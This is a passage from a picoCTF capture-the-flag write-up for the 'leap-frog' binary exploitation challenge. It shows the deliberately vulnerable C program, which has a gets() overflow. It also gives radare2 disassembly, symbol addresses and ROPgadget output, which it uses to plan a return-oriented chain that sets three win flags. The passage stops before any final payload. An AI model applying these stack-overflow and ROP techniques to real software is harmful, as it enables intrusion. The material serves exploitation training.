# leap-frog
Binary Exploitation, 300 points
## Description:
> Can you jump your way to win in the following program and get the flag?
```c
#include 
#include 
#include 
#include 
#include 
#include 
#define FLAG_SIZE 64
bool win1 = false;
bool win2 = false;
bool win3 = false;
void leapA() {
  win1 = true;
}
void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}
void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}
void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(flag, sizeof(flag), file);
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}
void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}
int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```
Note: Initially, the binary posted with the challenge had PIE enabled. After a while, the binary was replaced with a version with PIE disabled, and that's the version used for this solution.
## Solution:
We need to take over the stack using the buffer overflow in `vuln`, and use it to direct the flow execution: We must set `win1`, `win2` and `win3` to `true`, and finally call `display_flag` in order to get the flag.
This challenge is similar to last year's [rop chain](/2018_picoCTF/rop%20chain.md), however there's a twist: We can't call `leap3` directly, since its condition for setting `win3` to `true` can't be satisfied: `if (win1 && !win1)`. Therefore we must create a ROP-chain pieces together several gadgets in order to set `win3` to `true`.
What if we could skip the `if (win1 && !win1)` part and jump directly to `win3 = true;`?
Let's take a look at `leap3`:
```
root@kali:/media/sf_CTFs/pico/leap-frog# r2 rop
 -- Search returned no hits. Did you mean 'Misassemble'?
[0x080484d0]> aaa
[Cannot analyze at 0x080484c0g with sym. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[Cannot analyze at 0x080484c0ac)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080484d0]> s sym.leap3
[0x08048666]> agf
[0x08048666]>  # sym.leap3 ();
                                .-------------------------------------.
                                |  0x8048666                          |
                                | (fcn) sym.leap3 77                  |
                                |   sym.leap3 ();                     |
                                | ; var int32_t var_4h @ ebp-0x4      |
                                | push ebp                            |
                                | mov ebp, esp                        |
                                | push ebx                            |
                                | sub esp, 4                          |
                                | call sym.__x86.get_pc_thunk.ax;[oa] |
                                | add eax, 0x198e                     |
                                | movzx edx, byte [eax + 0x3d]        |
                                | test dl, dl                         |
                                | je 0x8048699                        |
                                `-------------------------------------'
                                        f t
                                        | |
                                        | '----------------------.
                         .--------------'                        |
                         |                                       |
                     .---------------------------------.         |
                     |  0x8048682                      |         |
                     | movzx edx, byte [eax + 0x3d]    |         |
                     | xor edx, 1                      |         |
                     | test dl, dl                     |         |
                     | je 0x8048699                    |         |
                     `---------------------------------'         |
                             f t                                 |
                             | |                                 |
                             | '--------.                        |
    .------------------------'          |                        |
    |                                   | .----------------------'
    |                                   | |
.-----------------------------.   .----------------------------------------------------.
|  0x8048690                  |   |  0x8048699                                         |
| mov byte [eax + 0x3f], 1    |   | ; CODE XREFS from sym.leap3 @ 0x8048680, 0x804868e |
| jmp 0x80486ad               |   | sub esp, 0xc                                       |
`-----------------------------'   | lea edx, [eax - 0x1724]                            |
    v                             | ; const char *s                                    |
    |                             | push edx                                           |
    |                             | mov ebx, eax                                       |
    |                             | ; int puts(const char *s)                          |
    |                             | call sym.imp.puts;[ob]                             |
    |                             | add esp, 0x10                                      |
    |                             `----------------------------------------------------'
    |                                 v
    |                                 |
    '------------------.              |
                       | .------------'
                       | |
                 .----------------------------------------.
                 |  0x80486ad                             |
                 | ; CODE XREF from sym.leap3 @ 0x8048697 |
                 | nop                                    |
                 | mov ebx, dword [var_4h]                |
                 | leave                                  |
                 | ret                                    |
                 `----------------------------------------'
```
The command that sets `win3` to `true` is `mov byte [eax + 0x3f], 1`. However, we can't jump directly to it - our `eax` value won't match the address of `win3`. 
`eax` gets its value from:
```assembly
call sym.__x86.get_pc_thunk.ax;[oa]
add eax, 0x198e
```
However if we jump all the way there, we will fail the checks related to `win1 && !win1`.
Therefore, we need to find a way to directly modify `win3` (`0x0804a03f`):
```
[0x08048666]> is~win
045 ---------- 0x0804a03d GLOBAL    OBJ    1 win1
046 ---------- 0x0804a03f GLOBAL    OBJ    1 win3
064 ---------- 0x0804a03e GLOBAL    OBJ    1 win2
```
Once that's done, we can call `leap2` and `leapA` in order to set `win2` and `win1` to `true`, and continue to `display_flag` in order to get the flag.
We start by using `ROPgadget` to check which gadgets allow us to write to a memory address:
```
root@kali:/media/sf_CTFs/pico/leap-frog# ROPgadget --binary rop  | grep "\["
...
0x080485f3 : mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
...
```
From the options provided by the tool, the best one actually seemed like the one we already met in `leap3`, adding `0x3d` to `eax` and setting the value to `1`. We just need to make sure that `eax == 0x0804a03f - 0x3d == 0x804a002` before jumping to that command.